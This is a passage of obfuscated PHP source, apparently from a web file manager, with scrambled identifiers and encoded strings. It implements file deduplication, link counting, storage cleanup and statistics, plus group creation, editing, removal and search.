IO::hashSimple($õã»¬¹ì), $¶ä¦¾ò›[2016] => $ó¼Œ«Ì¸ ? $ó¼Œ«Ì¸ : $ÆÔöô±ˆ); if ($İç÷ìîÏ = $this->addFileCheckExist($¤‰üéÎë[$¶ä¦¾ò›[647]], $¤‰üéÎë[$¶ä¦¾ò›[522]], $¤‰üéÎë[$¶ä¦¾ò›[79]])) { return $İç÷ìîÏ; } return $this->addFileData($¤‰üéÎë); } private function addFileData($ÊĞÊƒù´) { $ŠÖµà² =& $_SERVER[³à¼î¯á]; if (!$ÊĞÊƒù´) { return !1; } $ÊĞÊƒù´[$ŠÖµà²[79]] = intval($ÊĞÊƒù´[$ŠÖµà²[79]]); if (!$ÊĞÊƒù´[$ŠÖµà²[79]] && strlen($ÊĞÊƒù´[$ŠÖµà²[647]]) > 32) { $ÊĞÊƒù´[$ŠÖµà²[79]] = intval(substr($ÊĞÊƒù´[$ŠÖµà²[647]], 32)); } $ªä†ü£è = $this->add($ÊĞÊƒù´); return $this->find($ªä†ü£è); } public function addFile($­ÑöáÉâ, $§»ë¥, $”Ç‰±° = false) { $ÅÙİÛ¨Å =& $_SERVER[³à¼î¯á]; $²ÀÏ—ßã = IO::hashSimple($­ÑöáÉâ); $µäø¨©± = IO::size($­ÑöáÉâ); $ôê™Ş˜ = $µäø¨©± <= 1024 * 1024 * 10 ? IO::hashMd5($­ÑöáÉâ) : $ÅÙİÛ¨Å[12]; $‡Î¿áı« = $ÅÙİÛ¨Å[2017] . $²ÀÏ—ßã; CacheLock::lock($‡Î¿áı«); if ($ôê™Ş˜ && $²ÀÏ—ßã) { $Ñèøà² = $this->addFileCheckExist($²ÀÏ—ßã, $ôê™Ş˜, $µäø¨©±); if ($Ñèøà²) { CacheLock::unlock($‡Î¿áı«); return $Ñèøà²; } } $éêÈ»¿º = $this->addFileMake($­ÑöáÉâ, $µäø¨©±, $²ÀÏ—ßã, $ôê™Ş˜, $§»ë¥, $”Ç‰±°); $ëÚàÙ›ã = $this->addFileData($éêÈ»¿º); CacheLock::unlock($‡Î¿áı«); if (!$ôê™Ş˜ && $ëÚàÙ›ã) { $this->fileMd5Check($ëÚàÙ›ã); } return $ëÚàÙ›ã; } public function fileMd5Check($ª®Õ¿™Ù) { $“–Æ×ıø =& $_SERVER[³à¼î¯á]; $¬Ë›å÷ = array($ª®Õ¿™Ù[$“–Æ×ıø[516]], $ª®Õ¿™Ù[$“–Æ×ıø[87]]); $Ù´¬šç÷ = $“–Æ×ıø[2018] . $ª®Õ¿™Ù[$“–Æ×ıø[87]]; $ÈæÖ·ò¶ = $“–Æ×ıø[2019] . $ª®Õ¿™Ù[$“–Æ×ıø[516]]; TaskQueue::add($“–Æ×ıø[2020], $¬Ë›å÷, $Ù´¬šç÷, $ÈæÖ·ò¶); } public function fileMd5Set($†¥ Š£, $¹óÂŸ¡è) { $Ó‰±­ª‡ =& $_SERVER[³à¼î¯á]; $¶½ÙäÒê = $this->find($†¥ Š£); if (!$¶½ÙäÒê || $¶½ÙäÒê[$Ó‰±­ª‡[522]]) { return; } $ÙÁşƒ´ = IO::hashMd5($¹óÂŸ¡è); if (!$ÙÁşƒ´) { return $Ó‰±­ª‡[12]; } $this->where(array($Ó‰±­ª‡[516] => $†¥ Š£))->save(array($Ó‰±­ª‡[522] => $ÙÁşƒ´)); } public function addFileMake($Õñôİñë, $àš¼ø—, $Ò˜ù•éÈ, $Ë¯¼Ù„º, $ø•…ÔÉÔ, $œ¡–Ÿİ) { $ ™ğ‹·í =& $_SERVER[³à¼î¯á]; $ìÜëº–„ = $this->createFileName($ø•…ÔÉÔ, $Ò˜ù•éÈ, $Ë¯¼Ù„º); $Íı‡ƒ…ş = get_path_father($ìÜëº–„); $ÆøÀ•®ì = get_path_this($ìÜëº–„); if ($œ¡–Ÿİ) { $¡¿¾ó = IO::move($Õñôİñë, $Íı‡ƒ…ş, !1, $ÆøÀ•®ì); } else { $¡¿¾ó = IO::copy($Õñôİñë, $Íı‡ƒ…ş, !1, $ÆøÀ•®ì); } if (!$¡¿¾ó) { return !1; } $ê¯¯©’‰ = KodIO::defaultDriver(); $–·ë–Ñ• = array($ ™ğ‹·í[592] => $àš¼ø—, $ ™ğ‹·í[2014] => 1, $ ™ğ‹·í[469] => $ø•…ÔÉÔ, $ ™ğ‹·í[852] => $ê¯¯©’‰[$ ™ğ‹·í[450]], $ ™ğ‹·í[470] => $ìÜëº–„, $ ™ğ‹·í[2015] => $Ò˜ù•éÈ, $ ™ğ‹·í[2016] => $Ë¯¼Ù„º); return $–·ë–Ñ•; } public function addFileCheckExist($×¦„Æ»†, $Ì¯Ãì¹¾, $ÄÀ”®š³) { $˜©È‡Ûß =& $_SERVER[³à¼î¯á]; $Æºòêã° = $this->findByHash($×¦„Æ»†, $Ì¯Ãì¹¾); if (!$Æºòêã°) { return !1; } $ƒóï¨ÜÑ = array($˜©È‡Ûß[2014] => intval($Æºòêã°[$˜©È‡Ûß[2021]]) + 1, $˜©È‡Ûß[592] => $ÄÀ”®š³); $this->where(array($˜©È‡Ûß[517] => $Æºòêã°[$˜©È‡Ûß[516]]))->save($ƒóï¨ÜÑ); return $Æºòêã°; } public function remove($´¯ĞŒµ ) { $this->linkCountChange($´¯ĞŒµ , !1); $this->clearEmpty(); return !0; } public function linkAdd($ã É¦– ) { $this->linkCountChange($ã É¦– , !0); } public function linkCountChange($ğÄÄ¾³¸, $¤ ß«¯Ú) { $ãÒÌ«Ã =& $_SERVER[³à¼î¯á]; if (!$ğÄÄ¾³¸) { return; } if (!is_array($ğÄÄ¾³¸)) { $ğÄÄ¾³¸ = array($ğÄÄ¾³¸); } $´ÜŞã¸Ğ = array(); foreach ($ğÄÄ¾³¸ as $µƒÇè) { $€ğòí±ñ = $µƒÇè . $ãÒÌ«Ã[12]; if (!$´ÜŞã¸Ğ[$€ğòí±ñ]) { $´ÜŞã¸Ğ[$€ğòí±ñ] = 0; } $´ÜŞã¸Ğ[$€ğòí±ñ]++; } $ÂÚ÷îÌ´ = array(); foreach ($´ÜŞã¸Ğ as $µƒÇè => $‰ÕÃ¾ï) { $€ğòí±ñ = $‰ÕÃ¾ï . $ãÒÌ«Ã[12]; if (!$ÂÚ÷îÌ´[$€ğòí±ñ]) { $ÂÚ÷îÌ´[$€ğòí±ñ] = array(); } $ÂÚ÷îÌ´[$€ğòí±ñ][] = $µƒÇè; } foreach ($ÂÚ÷îÌ´ as $‰ÕÃ¾ï => $©­ì¸‹¼) { if (!$©­ì¸‹¼) { continue; } $‰ÕÃ¾ï = $¤ ß«¯Ú ? $‰ÕÃ¾ï : -intval($‰ÕÃ¾ï); $ïıû‘•œ = array($ãÒÌ«Ã[516] => array($ãÒÌ«Ã[7], $©­ì¸‹¼)); if ($‰ÕÃ¾ï < 0) { $ïıû‘•œ[$ãÒÌ«Ã[2021]] = array($ãÒÌ«Ã[1065], abs($‰ÕÃ¾ï)); } $this->where($ïıû‘•œ)->setAdd($ãÒÌ«Ã[2021], $‰ÕÃ¾ï); } } public function findByHash($³²ØôÀç, $Ÿ¶ÑèÀô = false) { $Ş¥öÍù =& $_SERVER[³à¼î¯á]; if (!$³²ØôÀç && !$Ÿ¶ÑèÀô) { return !1; } $ğ‰²Ãò£ = array($Ş¥öÍù[2015] => $³²ØôÀç); if ($Ÿ¶ÑèÀô) { $ğ‰²Ãò£ = array($Ş¥öÍù[2016] => $Ÿ¶ÑèÀô); } return $this->order($Ş¥öÍù[2022])->where($ğ‰²Ãò£)->find(); } public function clearEmpty($‰“·‹ŞÆ = 0) { $Œü€ºû =& $_SERVER[³à¼î¯á]; $õ¥¨Ä½µ = time() - 3600 * 24 * $‰“·‹ŞÆ; $‘ñİä¬± = $Œü€ºû[2023] . $õ¥¨Ä½µ; $ğ åé§Ó = $this->where($‘ñİä¬±)->select(); if (!$ğ åé§Ó) { return; } $˜³ºéî = new Task($Œü€ºû[2024], $Œü€ºû[12], count($ğ åé§Ó)); foreach ($ğ åé§Ó as $¯¯“©ß) { $˜³ºéî->update(1); $this->resetFile($¯¯“©ß); } $˜³ºéî->end(); } public function resetFile($÷©§¦·Ğ) { $ñ¢”²îğ =& $_SERVER[³à¼î¯á]; $ò°”úö² = array($ñ¢”²îğ[517] => $÷©§¦·Ğ[$ñ¢”²îğ[516]]); $şÆ¼õ¶Á = Model($ñ¢”²îğ[1388])->where($ò°”úö²)->count(); $‘¯ê¦½Á = Model($ñ¢”²îğ[2025])->where($ò°”úö²)->count(); $ÉğÉïÖ» = intval($şÆ¼õ¶Á) + intval($‘¯ê¦½Á); if ($ÉğÉïÖ» == 0) { IO::remove($÷©§¦·Ğ[$ñ¢”²îğ[87]]); Model($ñ¢”²îğ[2026])->delete($÷©§¦·Ğ[$ñ¢”²îğ[516]]); $this->where($ò°”úö²)->delete(); $this->metaSet($÷©§¦·Ğ[$ñ¢”²îğ[516]], null, null); write_log(ACTION . $ñ¢”²îğ[2027] . KodUser::id() . $ñ¢”²îğ[2028] . $÷©§¦·Ğ[$ñ¢”²îğ[516]] . $ñ¢”²îğ[2029] . $÷©§¦·Ğ[$ñ¢”²îğ[79]] . $ñ¢”²îğ[192] . $÷©§¦·Ğ[$ñ¢”²îğ[87]], $ñ¢”²îğ[2030]); return; } if ($÷©§¦·Ğ[$ñ¢”²îğ[2021]] != $ÉğÉïÖ») { $this->where($ò°”úö²)->save(array($ñ¢”²îğ[2014] => $ÉğÉïÖ»)); } } public function storageInfo($É¸¿À†ü = false) { $³âñŸº¨ =& $_SERVER[³à¼î¯á]; $¹šÆÇ“ = $this->count() + 0.0; $¶ììö´ = 0; $«¢é”ÖÔ = 1; $—ÛŒ ñ = 0; $Í¾µü±Ü = 5000; for ($ß¬Áë‘° = 0; $ß¬Áë‘° < $¹šÆÇ“; $ß¬Áë‘° = $ß¬Áë‘° + $Í¾µü±Ü) { $·ç‚¦¼ƒ = $this->limit($ß¬Áë‘°, $ß¬Áë‘° + $Í¾µü±Ü)->select(); foreach ($·ç‚¦¼ƒ as $œÇ Ÿı») { $«¢é”ÖÔ += $œÇ Ÿı»[$³âñŸº¨[79]] * $œÇ Ÿı»[$³âñŸº¨[2021]]; $¶ììö´ += $œÇ Ÿı»[$³âñŸº¨[79]] * ($œÇ Ÿı»[$³âñŸº¨[2021]] - 1); $—ÛŒ ñ += $œÇ Ÿı»[$³âñŸº¨[2021]]; } } $”Ù„©˜˜ = array($³âñŸº¨[2031] => $«¢é”ÖÔ, $³âñŸº¨[2032] => $¶ììö´, $³âñŸº¨[2033] => $¶ììö´ / $«¢é”ÖÔ, $³âñŸº¨[83] => $¹šÆÇ“, $³âñŸº¨[2034] => $—ÛŒ ñ); return $”Ù„©˜˜; } } goto Bà†åªâî‰; Bà†åªâî‰: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\155\x65" => "\147\x72\x6f\165\160\x5f\x6d\x65\x74\x61", "\155\x65\164\x61\106\151\145\x6c\x64" => "\x67\162\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($»ÃÄÍ) { $¯ˆËë—¢ =& $_SERVER[³à¼î¯á]; return array($¯ˆËë—¢[2035] => array($»ÃÄÍ[0], $¯ˆËë—¢[2036]), $¯ˆËë—¢[2037] => array($»ÃÄÍ[0], $¯ˆËë—¢[2038])); } protected function getInfo($†ãÀéÑÊ, $ÅîÆüö† = false) { $ìÀîÁ•ƒ = $this->getInfoSimple($†ãÀéÑÊ); if (!$ìÀîÁ•ƒ) { return !1; } if ($ÅîÆüö†) { return $this->_listDataApplyItem($ìÀîÁ•ƒ); } return $this->cacheFunctionGet($_SERVER[³à¼î¯á][2039], $†ãÀéÑÊ); } protected function getInfoSimple($™å¹­…Ë, $¥Úô§¼Ù = false) { $ü×«ÛÔ† =& $_SERVER[³à¼î¯á]; if ($¥Úô§¼Ù) { $¸İ†í’é = array($ü×«ÛÔ†[1952] => intval($™å¹­…Ë)); $éà·æ = $this->where($¸İ†í’é)->find(); return is_array($éà·æ) ? $éà·æ : array(); } return $this->cacheFunctionGet($ü×«ÛÔ†[2040], $™å¹­…Ë); } protected function groupAdd($Ëå—‹Ìê) { $¡¥ãı²ğ =& $_SERVER[³à¼î¯á]; if (!$Ëå—‹Ìê[$¡¥ãı²ğ[183]] && isset($Ëå—‹Ìê[$¡¥ãı²ğ[1952]]) && $Ëå—‹Ìê[$¡¥ãı²ğ[1952]] == 1) { if ($ö¸±¬„µ = $this->getInfoSimple($Ëå—‹Ìê[$¡¥ãı²ğ[1952]], !0)) { return $Ëå—‹Ìê[$¡¥ãı²ğ[1952]]; } } else { $ö¸±¬„µ = $this->getInfoSimple($Ëå—‹Ìê[$¡¥ãı²ğ[183]]); if (!$ö¸±¬„µ) { return !1; } } $ñÚ÷îÌ© = $¡¥ãı²ğ[570]; if ($ö¸±¬„µ[$¡¥ãı²ğ[560]]) { $ñÚ÷îÌ© = $ö¸±¬„µ[$¡¥ãı²ğ[560]] . $ö¸±¬„µ[$¡¥ãı²ğ[1952]] . $¡¥ãı²ğ[50]; } $ÉÄˆëØğ = array($¡¥ãı²ğ[469] => $this->groupNameAuto($Ëå—‹Ìê[$¡¥ãı²ğ[183]], $Ëå—‹Ìê[$¡¥ãı²ğ[32]]), $¡¥ãı²ğ[452] => $Ëå—‹Ìê[$¡¥ãı²ğ[183]], $¡¥ãı²ğ[627] => $ñÚ÷îÌ©, $¡¥ãı²ğ[2041] => $Ëå—‹Ìê[$¡¥ãı²ğ[1939]], $¡¥ãı²ğ[2042] => 0, $¡¥ãı²ğ[1956] => 0); if (isset($Ëå—‹Ìê[$¡¥ãı²ğ[1976]])) { $ÉÄˆëØğ[$¡¥ãı²ğ[1976]] = $Ëå—‹Ìê[$¡¥ãı²ğ[1976]]; } else { $üõ§¥Ü = $this->max($¡¥ãı²ğ[1976]); if (!$üõ§¥Ü) { $üõ§¥Ü = 0; } $ÉÄˆëØğ[$¡¥ãı²ğ[1976]] = $üõ§¥Ü + 1; } if (!empty($Ëå—‹Ìê[$¡¥ãı²ğ[1952]])) { $ÉÄˆëØğ[$¡¥ãı²ğ[1952]] = $Ëå—‹Ìê[$¡¥ãı²ğ[1952]]; } $ŒÙÖ’³‘ = $this->add($ÉÄˆëØğ); $this->setNamePinyin($ŒÙÖ’³‘, $ÉÄˆëØğ[$¡¥ãı²ğ[32]]); if (isset($Ëå—‹Ìê[$¡¥ãı²ğ[2043]])) { $this->metaSet($ŒÙÖ’³‘, array($¡¥ãı²ğ[2043] => $Ëå—‹Ìê[$¡¥ãı²ğ[2043]], $¡¥ãı²ğ[2044] => $Ëå—‹Ìê[$¡¥ãı²ğ[2044]])); unset($Ëå—‹Ìê[$¡¥ãı²ğ[2043]]); unset($Ëå—‹Ìê[$¡¥ãı²ğ[2044]]); } Model($¡¥ãı²ğ[1388])->groupRootAdd($ŒÙÖ’³‘); $this->_clearCache($Ëå—‹Ìê[$¡¥ãı²ğ[183]]); return $ŒÙÖ’³‘; } protected function groupEdit($ÅŠô×©€, $ƒ î‚Ğ) { $È€Ø¦Ÿ‹ =& $_SERVER[³à¼î¯á]; $ğÁ×¾ä÷ = $this->getInfoSimple($ÅŠô×©€); if (!$ğÁ×¾ä÷) { return !1; } if (!empty($ƒ î‚Ğ[$È€Ø¦Ÿ‹[183]])) { $ùáÊ·Ê  = $this->getInfoSimple($ƒ î‚Ğ[$È€Ø¦Ÿ‹[183]]); if (!$ùáÊ·Ê ) { return !1; } if ($ğÁ×¾ä÷[$È€Ø¦Ÿ‹[1952]] == $ùáÊ·Ê [$È€Ø¦Ÿ‹[1952]]) { return !1; } if ($ƒ î‚Ğ[$È€Ø¦Ÿ‹[183]] != $ğÁ×¾ä÷[$È€Ø¦Ÿ‹[183]]) { if ($ùáÊ·Ê [$È€Ø¦Ÿ‹[560]] !== $ğÁ×¾ä÷[$È€Ø¦Ÿ‹[560]] && strpos($ùáÊ·Ê [$È€Ø¦Ÿ‹[560]], $ğÁ×¾ä÷[$È€Ø¦Ÿ‹[560]] . $ğÁ×¾ä÷[$È€Ø¦Ÿ‹[1952]] . $È€Ø¦Ÿ‹[50]) === 0) { return !1; } $ƒ î‚Ğ[$È€Ø¦Ÿ‹[627]] = $ùáÊ·Ê [$È€Ø¦Ÿ‹[560]] . $ƒ î‚Ğ[$È€Ø¦Ÿ‹[183]] . $È€Ø¦Ÿ‹[50]; $this->_changeChildLevel($ğÁ×¾ä÷, $ùáÊ·Ê ); $this->_clearCache($ùáÊ·Ê [$È€Ø¦Ÿ‹[1952]]); $this->_clearCache($ğÁ×¾ä÷[$È€Ø¦Ÿ‹[183]]); } } if (isset($ƒ î‚Ğ[$È€Ø¦Ÿ‹[32]])) { $this->setNamePinyin($ÅŠô×©€, $ƒ î‚Ğ[$È€Ø¦Ÿ‹[32]]); } if (isset($ƒ î‚Ğ[$È€Ø¦Ÿ‹[2043]])) { $this->metaSet($ÅŠô×©€, array($È€Ø¦Ÿ‹[2043] => $ƒ î‚Ğ[$È€Ø¦Ÿ‹[2043]], $È€Ø¦Ÿ‹[2044] => $ƒ î‚Ğ[$È€Ø¦Ÿ‹[2044]])); unset($ƒ î‚Ğ[$È€Ø¦Ÿ‹[2043]]); unset($ƒ î‚Ğ[$È€Ø¦Ÿ‹[2044]]); } $this->_clearChildrenCache($ğÁ×¾ä÷); return $this->where(array($È€Ø¦Ÿ‹[2045] => $ÅŠô×©€))->save($ƒ î‚Ğ); } private function _clearChildrenCache($ôë³Æè) { $Ù’Ã±Úí =& $_SERVER[³à¼î¯á]; $Ğ‚µ™âÍ = array($Ù’Ã±Úí[627] => array($Ù’Ã±Úí[587], $ôë³Æè[$Ù’Ã±Úí[560]] . $ôë³Æè[$Ù’Ã±Úí[1952]] . $Ù’Ã±Úí[588])); $§ş•é = $this->field($Ù’Ã±Úí[1952])->where($Ğ‚µ™âÍ)->select(); foreach ($§ş•é as $šçˆè€†) { $this->_clearCache($šçˆè€†[$Ù’Ã±Úí[1952]]); } } private function _clearCache($óá…‡º) { $‘Æğ˜ ­ =& $_SERVER[³à¼î¯á]; $this->cacheFunctionClear($‘Æğ˜ ­[2039], $óá…‡º); $this->cacheFunctionClear($‘Æğ˜ ­[2040], $óá…‡º); } private function _changeChildLevel($î®úˆ‘, $¬úë„¶¡, $Ëø÷‘°© = false) { $ïÖÕöÉ› =& $_SERVER[³à¼î¯á]; $™’ İ´â = $î®úˆ‘[$ïÖÕöÉ›[560]] . $î®úˆ‘[$ïÖÕöÉ›[1952]] . $ïÖÕöÉ›[50]; $œï§»·Ì = $¬úë„¶¡[$ïÖÕöÉ›[560]] . $¬úë„¶¡[$ïÖÕöÉ›[1952]] . $ïÖÕöÉ›[50] . $î®úˆ‘[$ïÖÕöÉ›[1952]] . $ïÖÕöÉ›[50]; if ($Ëø÷‘°©) { $œï§»·Ì = $¬úë„¶¡[$ïÖÕöÉ›[560]] . $¬úë„¶¡[$ïÖÕöÉ›[1952]] . $ïÖÕöÉ›[50]; } $Ùøì†±ò = array($ïÖÕöÉ›[627] => array($ïÖÕöÉ›[587], $î®úˆ‘[$ïÖÕöÉ›[560]] . $î®úˆ‘[$ïÖÕöÉ›[1952]] . $ïÖÕöÉ›[588])); $ïû÷÷Õ = array($ïÖÕöÉ›[627] => array($ïÖÕöÉ›[636], "\x72\x65\160\154\x61\143\145\x28\160\141\x72\145\x6e\164\x4c\145\166\x65\x6c\54\x27{$™’ İ´â}\x27\54\x27{$œï§»·Ì}\x27\51")); $this->_clearChildrenCache($î®úˆ‘); $this->where($Ùøì†±ò)->data($ïû÷÷Õ)->save(); } public function setNamePinyin($şçŞÊ¥ß, $ñøÀ÷óå = false) { $ôŞÏéÀ‚ =& $_SERVER[³à¼î¯á]; if (!$ñøÀ÷óå) { $â—Ğ¼¥™ = $this->getInfoSimple($şçŞÊ¥ß); $ñøÀ÷óå = $â—Ğ¼¥™[$ôŞÏéÀ‚[32]]; } if (!Input::check($ñøÀ÷óå, $ôŞÏéÀ‚[630])) { $this->metaSet($şçŞÊ¥ß, $ôŞÏéÀ‚[513], null); $this->metaSet($şçŞÊ¥ß, $ôŞÏéÀ‚[512], null); return; } $©´ÌÓéŞ = array($ôŞÏéÀ‚[513] => str_replace($ôŞÏéÀ‚[53], $ôŞÏéÀ‚[12], Pinyin::get($ñøÀ÷óå)), $ôŞÏéÀ‚[512] => Pinyin::get($ñøÀ÷óå, $ôŞÏéÀ‚[631])); $this->metaSet($şçŞÊ¥ß, $©´ÌÓéŞ); } protected function groupStatus($ú ­ŠÒ, $©ö¤ƒ÷Ó) { $ÂêëˆäÖ =& $_SERVER[³à¼î¯á]; $£€³Ñê† = $this->getInfoSimple($ú ­ŠÒ); if (!$£€³Ñê†) { return !1; } $this->_clearCache($ú ­ŠÒ); return $this->metaSet($ú ­ŠÒ, $ÂêëˆäÖ[795], $©ö¤ƒ÷Ó); if ($©ö¤ƒ÷Ó == $ÂêëˆäÖ[91]) { $§ç‚¹´Ô = $this->parentLevelArray($£€³Ñê†[$ÂêëˆäÖ[560]]); } else { } $§ç‚¹´Ô[] = $£€³Ñê†[$ÂêëˆäÖ[1952]]; $·Ä‹ÓÄÜ = array(); foreach ($§ç‚¹´Ô as $ú ­ŠÒ) { $·Ä‹ÓÄÜ[] = array($ÂêëˆäÖ[1952] => $ú ­ŠÒ, $ÂêëˆäÖ[97] => $ÂêëˆäÖ[795], $ÂêëˆäÖ[425] => $©ö¤ƒ÷Ó); $this->_clearCache($ú ­ŠÒ); } return Model($ÂêëˆäÖ[2046])->addAll($·Ä‹ÓÄÜ, array(), !0); } protected function groupRemove($ıö¬Ìä˜, $¥´„ğº = false) { $êªä‹ =& $_SERVER[³à¼î¯á]; $ó ÜÕÅÌ = array($êªä‹[1952] => $ıö¬Ìä˜); $±™ÁµÈ§ = $this->where($ó ÜÕÅÌ)->find(); if (!$±™ÁµÈ§ || $±™ÁµÈ§[$êªä‹[183]] == 0) { return !1; } if (!$¥´„ğº) { $¼ ÜÈ¸È = $this->getInfoSimple($±™ÁµÈ§[$êªä‹[183]]); $this->_changeChildLevel($±™ÁµÈ§, $¼ ÜÈ¸È, !0); $this->where(array($êªä‹[183] => $ıö¬Ìä˜))->save(array($êªä‹[183] => $±™ÁµÈ§[$êªä‹[183]])); $this->_clearCache($¼ ÜÈ¸È[$êªä‹[1952]]); } Model($êªä‹[2046])->where($ó ÜÕÅÌ)->delete(); Model($êªä‹[2047])->where($ó ÜÕÅÌ)->delete(); Model($êªä‹[869])->groupRootRemove($ıö¬Ìä˜); $this->_clearCache($±™ÁµÈ§[$êªä‹[183]]); return $this->where($ó ÜÕÅÌ)->delete(); } protected function groupSort($ÆøÔ›§‰) { $ÆÆ„Õá =& $_SERVER[³à¼î¯á]; $ñâÉåŸÇ = array(); foreach ($ÆøÔ›§‰ as $‘‡é—® => $·¡Å†Ê) { $ñâÉåŸÇ[] = array($ÆÆ„Õá[1952], $·¡Å†Ê, $ÆÆ„Õá[1976], $‘‡é—® + 1); } $this->saveAll($ñâÉåŸÇ); } public function listData() { $Êï¯ñ»é = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Êï¯ñ»é[$_SERVER[³à¼î¯á][420]]); return $Êï¯ñ»é; } private function _makeOrder($Æ»ô¬ = '') { $…÷®âÁ• =& $_SERVER[³à¼î¯á]; $ÍØ…Å—Ç = array($…÷®âÁ•[1952], $…÷®âÁ•[32], $…÷®âÁ•[1941], $…÷®âÁ•[222]); $½®‡úù¨ = array($…÷®âÁ•[498] => $…÷®âÁ•[499], $…÷®âÁ•[500] => $…÷®âÁ•[501]); $ÌÅß¹Â† = Input::get($…÷®âÁ•[505], $…÷®âÁ•[7], $…÷®âÁ•[1956], $ÍØ…Å—Ç); $èùšÄé± = Input::get($…÷®âÁ•[506], $…÷®âÁ•[7], $…÷®âÁ•[2048], array($…÷®âÁ•[2048], $…÷®âÁ•[500])); $èùšÄé± = $½®‡úù¨[$èùšÄé±]; $Æ»ô¬ = $Æ»ô¬ . "{$ÌÅß¹Â†}\40{$èùšÄé±}\54\x20\x67\162\x6f\x75\x70\x49\104\40\x61\163\143"; return $this->order($Æ»ô¬); } public function listChild($„ŒÀ‚æ‹) { $á©€–Âó =& $_SERVER[³à¼î¯á]; $’ñ‚ù®´ = $this->where(array($á©€–Âó[183] => $„ŒÀ‚æ‹))->_makeOrder()->selectPage(200); $this->_listDataApply($’ñ‚ù®´[$á©€–Âó[420]]); return $’ñ‚ù®´; } public function listChildIds($†ì÷ú‹Ø) { $ª®Ê·ºñ =& $_SERVER[³à¼î¯á]; if (is_string($×ãôìõü)) { $†ì÷ú‹Ø = explode($ª®Ê·ºñ[50], $†ì÷ú‹Ø); } $˜ç¿…¸Å = $this->where(array($ª®Ê·ºñ[1952] => array($ª®Ê·ºñ[7], $†ì÷ú‹Ø)))->field($ª®Ê·ºñ[2049])->select(); if (!$˜ç¿…¸Å) { return !1; } $»íş»™ = array(); foreach ($˜ç¿…¸Å as $ã£¹É˜ô) { $»íş»™[] = "\163\145\154\145\143\164\40\x67\162\x6f\x75\160\x49\104\40\x66\162\x6f\155\x20\x60\x67\162\157\x75\160\140\40\167\x68\145\x72\145\x20\160\x61\x72\145\x6e\x74\x4c\x65\166\145\154\40\x6c\151\153\x65\x20\47{$ã£¹É˜ô[$ª®Ê·ºñ[560]]}{$ã£¹É˜ô[$ª®Ê·ºñ[1952]]}\x2c\x25\x27"; } $»íş»™ = implode($ª®Ê·ºñ[2050], $»íş»™); $˜ç¿…¸Å = $this->query($»íş»™); if (!$˜ç¿…¸Å) { return array(); } $†ì÷ú‹Ø = array_to_keyvalue($˜ç¿…¸Å, $ª®Ê·ºñ[12], $ª®Ê·ºñ[1952]); return array_unique($†ì÷ú‹Ø); } public function listByID($õÏÆÇÚ²) { $ÚŞÂ¼Ÿğ =& $_SERVER[³à¼î¯á]; if (!$õÏÆÇÚ²) { return array(); } $ëìõ±…‡ = array($ÚŞÂ¼Ÿğ[1952] => array($ÚŞÂ¼Ÿğ[7], $õÏÆÇÚ²)); $³¿ ƒëÜ = $this->where($ëìõ±…‡)->select(); $³¿ ƒëÜ = array_sort_keep($³¿ ƒëÜ, $ÚŞÂ¼Ÿğ[1952], $õÏÆÇÚ²); $this->_listDataApply($³¿ ƒëÜ); return $³¿ ƒëÜ; } public function listSearch($Ç¹ğ”Ö‘) { $Ñ™¾®­ì =& $_SERVER[³à¼î¯á]; $Ğ‘¯Œ”” = trim($Ç¹ğ”Ö‘[$Ñ™¾®­ì[2051]]); $œ§¡íï = explode($Ñ™¾®­ì[53], $Ğ‘¯Œ””); if (!$Ğ‘¯Œ”” || count($œ§¡íï) == 1) { return $this->listSearchNow($Ç¹ğ”Ö‘); } $÷Óšì†Ê = array($Ñ™¾®­ì[420] => array()); foreach ($œ§¡íï as $‹Ü•´Ÿ) { if (!trim($‹Ü•´Ÿ)) { continue; } $Ç¹ğ”Ö‘[$Ñ™¾®­ì[2051]] = $‹Ü•´Ÿ; $õŒİÀÉŒ = $this->listSearchNow($Ç¹ğ”Ö‘); $÷Óšì†Ê[$Ñ™¾®­ì[420]] = array_merge($÷Óšì†Ê[$Ñ™¾®­ì[420]], $õŒİÀÉŒ[$Ñ™¾®­ì[420]]); } $÷Óšì†Ê[$Ñ™¾®­ì[420]] = array_unique_by_key($÷Óšì†Ê[$Ñ™¾®­ì[420]], $Ñ™¾®­ì[1952]); $÷Óšì†Ê[$Ñ™¾®­ì[417]] = array($Ñ™¾®­ì[418] => count($÷Óšì†Ê[$Ñ™¾®­ì[420]]), $Ñ™¾®­ì[414] => 20, $Ñ™¾®­ì[404] => 1, $Ñ™¾®­ì[419] => 1); return $÷Óšì†Ê; } public function listSearchNow($°Ü«ä„¿) { $º¹áÀ =& $_SERVER[³à¼î¯á]; $Ÿ¯Òöà« = trim($°Ü«ä„¿[$º¹áÀ[2051]]); $‡ŠË‹ÖÍ = isset($°Ü«ä„¿[$º¹áÀ[2052]]) ? $°Ü«ä„¿[$º¹áÀ[2052]] : !1; if (!trim($Ÿ¯Òöà«)) { return !1; } $Ÿ¯Òöà« = str_replace($º¹áÀ[2053], $º¹áÀ[2054], $Ÿ¯Òöà«); $²½Ï‰ïš = array($º¹áÀ[1952] => array($º¹áÀ[434], "{$Ÿ¯Òöà«}\x25"), $º¹áÀ[32] => array($º¹áÀ[434], "\x25{$Ÿ¯Òöà«}\45"), $º¹áÀ[1050] => $º¹áÀ[2055]); if ($‡ŠË‹ÖÍ) { $İâ¾‰›„ = $this->getInfoSimple($‡ŠË‹ÖÍ); $‚µ”Ş½ = $İâ¾‰›„[$º¹áÀ[560]] . $‡ŠË‹ÖÍ . $º¹áÀ[588]; $²½Ï‰ïš = array($²½Ï‰ïš, array($º¹áÀ[560] => array($º¹áÀ[434], $‚µ”Ş½))); } $²½Ï‰ïš = $this->parseWhereLike($²½Ï‰ïš); $­‚›Ğø‰ = $this->_makeOrder()->where($²½Ï‰ïš)->selectPage(20); $­‚›Ğø‰ = $­‚›Ğø‰ ? $­‚›Ğø‰ : array($º¹áÀ[420] => array(), $º¹áÀ[417] => array()); if (!$­‚›Ğø‰ || count($­‚›Ğø‰[$º¹áÀ[420]]) < 5 && Input::check($Ÿ¯Òöà«, $º¹áÀ[369])) { $’ºÍãßø = $this->groupChildrenAll($‡ŠË‹ÖÍ); $“Ÿèº¥ = $this->_searchFromMeta($º¹áÀ[512], $Ÿ¯Òöà«, 10, $’ºÍãßø); $Œ‚¼´ıÖ = $this->_searchFromMeta($º¹áÀ[513], $Ÿ¯Òöà«, 10, $’ºÍãßø); $ÜñÚ°ø› = array_merge($“Ÿèº¥, $Œ‚¼´ıÖ, 